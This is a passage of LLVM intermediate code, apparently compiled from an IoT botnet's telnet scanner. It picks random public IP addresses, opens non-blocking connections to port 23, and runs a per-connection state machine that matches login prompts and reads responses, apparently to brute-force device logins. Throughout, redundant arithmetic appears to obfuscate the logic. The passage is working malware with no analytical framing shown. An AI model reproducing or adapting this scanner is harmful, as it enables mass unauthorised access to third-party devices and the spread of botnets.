  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %62

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = sub i32 %57, 1854780024
  %59 = add i32 %58, 1
  %60 = add i32 %59, 1854780024
  %61 = add nsw i32 %57, 1
  store i32 %60, i32* %2, align 4
  br label %37

; <label>:62:                                     ; preds = %37
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %63, align 8
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %64, align 8
  br label %65

; <label>:65:                                     ; preds = %1031, %62
  br label %66

; <label>:66:                                     ; preds = %65
  store i32 0, i32* %2, align 4
  br label %67

; <label>:67:                                     ; preds = %1025, %66
  %68 = load i32, i32* %2, align 4
  %69 = load i32, i32* %1, align 4
  %70 = icmp slt i32 %68, %69
  br i1 %70, label %71, label %1031

; <label>:71:                                     ; preds = %67
  %72 = load i32, i32* %2, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %73
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i32 0, i32 2
  %76 = load i8, i8* %75, align 8
  %77 = zext i8 %76 to i32
  switch i32 %77, label %1024 [
    i32 0, label %78
    i32 1, label %244
    i32 2, label %416
    i32 3, label %518
    i32 4, label %586
    i32 5, label %713
    i32 6, label %781
    i32 7, label %927
    i32 8, label %955
  ]

; <label>:78:                                     ; preds = %71
  %79 = load i32, i32* %2, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %80
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %81, i32 0, i32 8
  %83 = load i8*, i8** %82, align 8
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 1024, i32 1, i1 false)
  %84 = load i32, i32* %2, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %85
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %86, i32 0, i32 3
  %88 = load i8, i8* %87, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %110

; <label>:90:                                     ; preds = %78
  %91 = load i32, i32* %2, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 8
  %95 = load i8*, i8** %94, align 8
  store i8* %95, i8** %11, align 8
  %96 = load i32, i32* %2, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %97
  %99 = bitcast %struct.telstate_t* %98 to i8*
  call void @llvm.memset.p0i8.i64(i8* %99, i8 0, i64 32, i32 16, i1 false)
  %100 = load i8*, i8** %11, align 8
  %101 = load i32, i32* %2, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 8
  store i8* %100, i8** %104, align 8
  %105 = call i32 @getRandomPublicIP()
  %106 = load i32, i32* %2, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %107
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %108, i32 0, i32 1
  store i32 %105, i32* %109, align 4
  br label %155

; <label>:110:                                    ; preds = %78
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 5
  %115 = load i8, i8* %114, align 1
  %116 = add i8 %115, 45
  %117 = add i8 %116, 1
  %118 = sub i8 %117, 45
  %119 = add i8 %115, 1
  store i8 %118, i8* %114, align 1
  %120 = load i32, i32* %2, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 5
  %124 = load i8, i8* %123, align 1
  %125 = zext i8 %124 to i64
  %126 = icmp eq i64 %125, 16
  br i1 %126, label %127, label %141

; <label>:127:                                    ; preds = %110
  %128 = load i32, i32* %2, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 5
  store i8 0, i8* %131, align 1
  %132 = load i32, i32* %2, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 4
  %136 = load i8, i8* %135, align 2
  %137 = sub i8 %136, 7
  %138 = add i8 %137, 1
  %139 = add i8 %138, 7
  %140 = add i8 %136, 1
  store i8 %139, i8* %135, align 2
  br label %141

; <label>:141:                                    ; preds = %127, %110
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = zext i8 %146 to i64
  %148 = icmp eq i64 %147, 7
  br i1 %148, label %149, label %154

; <label>:149:                                    ; preds = %141
  %150 = load i32, i32* %2, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 3
  store i8 1, i8* %153, align 1
  br label %1025

; <label>:154:                                    ; preds = %141
  br label %155

; <label>:155:                                    ; preds = %154, %90
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %156, align 4
  %157 = call zeroext i16 @htons(i16 zeroext 23) #13
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %157, i16* %158, align 2
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %160 = getelementptr inbounds [8 x i8], [8 x i8]* %159, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 8, i32 4, i1 false)
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 1
  %165 = load i32, i32* %164, align 4
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  %168 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %169 = load i32, i32* %2, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 0
  store i32 %168, i32* %172, align 16
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = bitcast %struct.timeval* %10 to i8*
  %179 = call i32 @setsockopt(i32 %177, i32 1, i32 20, i8* %178, i32 16) #2
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = bitcast %struct.timeval* %10 to i8*
  %186 = call i32 @setsockopt(i32 %184, i32 1, i32 21, i8* %185, i32 16) #2
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %194

; <label>:193:                                    ; preds = %155
  br label %1025

; <label>:194:                                    ; preds = %155
  %195 = load i32, i32* %2, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 16
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = call i32 (i32, i32, ...) @fcntl(i32 %204, i32 3, i8* null)
  %206 = and i32 %205, 2048
  %207 = xor i32 %205, 2048
  %208 = or i32 %206, %207
  %209 = or i32 %205, 2048
  %210 = call i32 (i32, i32, ...) @fcntl(i32 %199, i32 4, i32 %208)
  %211 = load i32, i32* %2, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %212
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 16
  %216 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %217 = call i32 @connect(i32 %215, %struct.sockaddr* %216, i32 16)
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %219, label %234

; <label>:219:                                    ; preds = %194
  %220 = call i32* @__errno_location() #13
  %221 = load i32, i32* %220, align 4
  %222 = icmp ne i32 %221, 115
  br i1 %222, label %223, label %234

; <label>:223:                                    ; preds = %219
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 16
  %229 = call i32 @sclose(i32 %228)
  %230 = load i32, i32* %2, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 3
  store i8 1, i8* %233, align 1
  br label %243

; <label>:234:                                    ; preds = %219, %194
  %235 = load i32, i32* %2, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 2
  store i8 1, i8* %238, align 8
  %239 = load i32, i32* %2, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 6
  store i32 0, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %234, %223
  br label %1024

; <label>:244:                                    ; preds = %71
  %245 = load i32, i32* %2, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 6
  %249 = load i32, i32* %248, align 4
  %250 = icmp eq i32 %249, 0
  br i1 %250, label %251, label %257

; <label>:251:                                    ; preds = %244
  %252 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %253 = load i32, i32* %2, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %254
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %255, i32 0, i32 6
  store i32 %252, i32* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %251, %244
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %260 = getelementptr inbounds [16 x i64], [16 x i64]* %259, i64 0, i64 0
  %261 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %260) #2, !srcloc !5
  %262 = extractvalue { i64, i64* } %261, 0
  %263 = extractvalue { i64, i64* } %261, 1
  %264 = trunc i64 %262 to i32
  store i32 %264, i32* %12, align 4
  %265 = ptrtoint i64* %263 to i64
  %266 = trunc i64 %265 to i32
  store i32 %266, i32* %13, align 4
  br label %267

; <label>:267:                                    ; preds = %258
  br label %268

; <label>:268:                                    ; preds = %267
  %269 = load i32, i32* %2, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %270
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %271, i32 0, i32 0
  %273 = load i32, i32* %272, align 16
  %274 = srem i32 %273, 64
  %275 = zext i32 %274 to i64
  %276 = shl i64 1, %275
  %277 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %278 = load i32, i32* %2, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 0
  %282 = load i32, i32* %281, align 16
  %283 = sdiv i32 %282, 64
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds [16 x i64], [16 x i64]* %277, i64 0, i64 %284
  %286 = load i64, i64* %285, align 8
  %287 = and i64 %286, %276
  %288 = xor i64 %286, %276
  %289 = or i64 %287, %288
  %290 = or i64 %286, %276
  store i64 %289, i64* %285, align 8
  %291 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %291, align 8
  %292 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %292, align 8
  %293 = load i32, i32* %2, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %294
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 16
  %298 = add i32 %297, 678192340
  %299 = add i32 %298, 1
  %300 = sub i32 %299, 678192340
  %301 = add nsw i32 %297, 1
  %302 = call i32 @select(i32 %300, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %302, i32* %3, align 4
  %303 = load i32, i32* %3, align 4
  %304 = icmp eq i32 %303, 1
  br i1 %304, label %305, label %369

; <label>:305:                                    ; preds = %268
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = bitcast i32* %7 to i8*
  %312 = call i32 @getsockopt(i32 %310, i32 1, i32 4, i8* %311, i32* %6) #2
  %313 = load i32, i32* %7, align 4
  %314 = icmp ne i32 %313, 0
  br i1 %314, label %315, label %330

; <label>:315:                                    ; preds = %305
  %316 = load i32, i32* %2, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 16
  %321 = call i32 @sclose(i32 %320)
  %322 = load i32, i32* %2, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 2
  store i8 0, i8* %325, align 8
  %326 = load i32, i32* %2, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %327
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %328, i32 0, i32 3
  store i8 1, i8* %329, align 1
  br label %368

; <label>:330:                                    ; preds = %305
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = load i32, i32* %2, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %337
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %338, i32 0, i32 0
  %340 = load i32, i32* %339, align 16
  %341 = call i32 (i32, i32, ...) @fcntl(i32 %340, i32 3, i8* null)
  %342 = xor i32 %341, -1
  %343 = xor i32 -2049, -1
  %344 = xor i32 1363486601, -1
  %345 = or i32 %342, %343
  %346 = or i32 1363486601, %344
  %347 = xor i32 %345, -1
  %348 = and i32 %347, %346
  %349 = and i32 %341, -2049
  %350 = call i32 (i32, i32, ...) @fcntl(i32 %335, i32 4, i32 %348)
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 6
  store i32 0, i32* %354, align 4
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 7
  store i16 0, i16* %358, align 16
  %359 = load i32, i32* %2, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %360
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %361, i32 0, i32 8
  %363 = load i8*, i8** %362, align 8
  call void @llvm.memset.p0i8.i64(i8* %363, i8 0, i64 1024, i32 1, i1 false)
  %364 = load i32, i32* %2, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 2
  store i8 2, i8* %367, align 8
  br label %1025

; <label>:368:                                    ; preds = %315
  br label %388

; <label>:369:                                    ; preds = %268
  %370 = load i32, i32* %3, align 4
  %371 = icmp eq i32 %370, -1
  br i1 %371, label %372, label %387

; <label>:372:                                    ; preds = %369
  %373 = load i32, i32* %2, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 0
  %377 = load i32, i32* %376, align 16
  %378 = call i32 @sclose(i32 %377)
  %379 = load i32, i32* %2, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 2
  store i8 0, i8* %382, align 8
  %383 = load i32, i32* %2, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 3
  store i8 1, i8* %386, align 1
  br label %387

; <label>:387:                                    ; preds = %372, %369
  br label %388

; <label>:388:                                    ; preds = %387, %368
  %389 = load i32, i32* %2, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 6
  %393 = load i32, i32* %392, align 4
  %394 = sub i32 %393, -1858732861
  %395 = add i32 %394, 5
  %396 = add i32 %395, -1858732861
  %397 = add i32 %393, 5
  %398 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %399 = icmp ult i32 %396, %398
  br i1 %399, label %400, label %415

; <label>:400:                                    ; preds = %388
  %401 = load i32, i32* %2, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 0
  %405 = load i32, i32* %404, align 16
  %406 = call i32 @sclose(i32 %405)
  %407 = load i32, i32* %2, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %409, i32 0, i32 2
  store i8 0, i8* %410, align 8
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 3
  store i8 1, i8* %414, align 1
  br label %415

; <label>:415:                                    ; preds = %400, %388
  br label %1024

; <label>:416:                                    ; preds = %71
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 6
  %421 = load i32, i32* %420, align 4
  %422 = icmp eq i32 %421, 0
  br i1 %422, label %423, label %429

; <label>:423:                                    ; preds = %416
  %424 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %425 = load i32, i32* %2, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %426
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %427, i32 0, i32 6
  store i32 %424, i32* %428, align 4
  br label %429

; <label>:429:                                    ; preds = %423, %416
  %430 = load i32, i32* %2, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 8
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @matchPrompt(i8* %434)
  %436 = icmp ne i32 %435, 0
  br i1 %436, label %437, label %442

; <label>:437:                                    ; preds = %429
  %438 = load i32, i32* %2, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 2
  store i8 7, i8* %441, align 8
  br label %442

; <label>:442:                                    ; preds = %437, %429
  %443 = load i32, i32* %2, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = load i32, i32* %2, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 8
  %452 = load i8*, i8** %451, align 8
  %453 = load i32, i32* %2, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 7
  %457 = load i16, i16* %456, align 16
  %458 = zext i16 %457 to i32
  %459 = call i32 @readUntil(i32 %447, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %452, i32 1024, i32 %458)
  %460 = icmp ne i32 %459, 0
  br i1 %460, label %461, label %479

; <label>:461:                                    ; preds = %442
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 6
  store i32 0, i32* %465, align 4
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 7
  store i16 0, i16* %469, align 16
  %470 = load i32, i32* %2, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %471
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %472, i32 0, i32 8
  %474 = load i8*, i8** %473, align 8
  call void @llvm.memset.p0i8.i64(i8* %474, i8 0, i64 1024, i32 1, i1 false)
  %475 = load i32, i32* %2, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 2
  store i8 3, i8* %478, align 8
  br label %1025

; <label>:479:                                    ; preds = %442
  %480 = load i32, i32* %2, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 8
  %484 = load i8*, i8** %483, align 8
  %485 = call i64 @strlen(i8* %484) #10
  %486 = trunc i64 %485 to i16
  %487 = load i32, i32* %2, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 7
  store i16 %486, i16* %490, align 16
  br label %491

; <label>:491:                                    ; preds = %479
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 6
